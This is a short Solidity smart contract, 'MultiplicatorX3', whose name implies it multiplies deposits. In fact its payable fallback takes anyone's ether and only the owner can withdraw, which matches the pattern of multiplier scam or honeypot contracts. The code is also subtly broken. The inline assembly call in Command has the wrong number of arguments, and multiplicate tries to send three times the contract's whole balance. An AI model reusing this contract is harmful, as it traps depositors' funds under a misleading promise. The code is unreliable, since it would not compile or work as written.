pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        bool success;
        bytes4 sig = bytes4(keccak256("multiplicate(address)"));
        assembly {
            success := call(sub(gas, 5000), adr, msg.value, sig, adr)
        }
        require(success);
    }

    function multiplicate(address adr) public payable {
        require(msg.sender == Owner);
        require(msg.value >= this.balance);

        adr.transfer(this.balance * 3);
    }
}